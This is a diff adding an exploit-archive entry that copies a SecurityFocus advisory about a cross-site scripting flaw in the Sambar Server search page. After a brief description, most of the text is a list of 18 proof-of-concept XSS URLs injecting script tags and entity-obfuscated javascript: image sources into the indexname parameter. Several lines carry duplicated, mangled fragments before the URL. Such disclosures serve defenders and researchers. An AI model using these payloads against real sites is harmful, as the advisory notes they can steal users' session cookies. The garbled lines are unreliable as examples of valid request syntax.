@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/13722/info
+
+Sambar Server administrative interface does not adequately filter some HTML code thus making it prone to cross-site scripting attacks. It is possible for a remote attacker to create a malicious link containing script code which will be executed in the browser of a legitimate user. All code will be executed within the context of the Web site running Sambar Server.
+
+This issue may be exploited to steal cookie-based authentication credentials from legitimate users of the Web site running the vulnerable software. 
+
+1.">alert("XSS")&style=fancy&spage=10&query=Folder%name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=10&query=Folder%name
+2.%22%27>&style=fancy&spage=10&query=Folder%name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=10&query=Folder%name
+3.">alert("XSS")&style=fancy&spage=20&query=Folder%20name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=20&query=Folder%20name
+4.%22%27>&style=fancy&spage=20&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=20&query=Folder%20name
+5.">alert("XSS")&style=fancy&spage=30&query=Folder%20name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=30&query=Folder%20name
+6.%22%27>&style=fancy&spage=30&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=30&query=Folder%20name
+7.">alert("XSS")&style=fancy&spage=40&query=Folder%20name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=40&query=Folder%20name
+8.%22%27>&style=fancy&spage=40&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=40&query=Folder%20name
+9.">alert("XSS")&style=fancy&spage=50&query=Folder%20name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=50&query=Folder%20name
+10.%22%27>&style=fancy&spage=50&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=50&query=Folder%20name
+11.">alert("XSS")&style=fancy&spage=60&query=Folder%20name'>http://www.example.com/search/results.stm?indexname=>"><script>alert("XSS")</script>&style=fancy&spage=60&query=Folder%20name
+12.%22%27>&style=fancy&spage=60&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>%22%27><img%20src%3d%22javascript:alert(%27XSS%27)%22>&style=fancy&spage=60&query=Folder%20name
+
+1."'>&style=fancy&spage=10&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=10&query=Folder%20name
+2."'>&style=fancy&spage=20&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=20&query=Folder%20name
+3."'>&style=fancy&spage=30&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=30&query=Folder%20name
+4."'>http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=40&query=Folder%20name
+5."'>&style=fancy&spage=50&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=50&query=Folder%20name
+6."'>&style=fancy&spage=60&query=Folder%20name">http://www.example.com/search/results.stm?indexname=>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;XSS%26quot;)>&style=fancy&spage=60&query=Folder%20name
